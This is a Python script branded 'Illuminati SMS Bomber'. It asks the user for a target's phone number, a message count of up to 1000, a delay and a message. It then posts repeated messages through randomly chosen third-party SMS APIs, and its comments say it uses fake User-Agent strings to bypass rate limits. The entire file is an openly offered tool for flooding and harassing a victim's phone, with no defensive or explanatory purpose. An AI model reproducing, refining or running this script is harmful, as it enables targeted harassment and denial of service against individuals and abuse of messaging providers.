import requests
import time
import random
from faker import Faker
from colorama import Fore, Style

# ✅ Fake User-Agent for bypassing rate limits
fake = Faker()

# ✅ API Endpoints for SMS Bombing
APIs = [
    "https://www.fast2sms.com/dev/bulkV2",
    "https://textbelt.com/text",
    "https://api.callmebot.com/sms/send.php",
    "https://api.twilio.com",
    "https://api.nexmo.com/v1/messages"
]

# ✅ Send SMS Function

def send_sms(target, message):
    headers = {
        'User-Agent': fake.user_agent(),
        'Content-Type': 'application/json'
    }

    # Randomly select API
    api = random.choice(APIs)

    # API Payload
    payload = {
        "phone": target,
        "message": message,
        "apikey": "your_api_key_here"  # Replace with your API Key if needed
    }

    # Send Request
    try:
        response = requests.post(api, headers=headers, json=payload)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+] SMS Sent Successfully via {api}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[-] SMS Failed via {api}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error Occurred: {e}" + Style.RESET_ALL)

# ✅ Main Function

def sms_bomber():
    print(Fore.RED + "💥 Welcome to Illuminati SMS Bomber 💥" + Style.RESET_ALL)

    # Input
    target = input("💀 Enter Target Phone Number (with Country Code): ")
    count = int(input("💀 How many SMS to send? (Max 1000): "))
    delay = int(input("💀 Enter delay between messages (in seconds): "))
    message = input("💀 Enter the Message to Send: ")

    # Bombing Process
    print(Fore.YELLOW + f"\n💥 Sending {count} SMS to {target}" + Style.RESET_ALL)

    for i in range(count):
        send_sms(target, message)
        time.sleep(delay)

    print(Fore.GREEN + "\n💀 SMS Bombing Completed! 💀" + Style.RESET_ALL)

if __name__ == "__main__":
    sms_bomber()
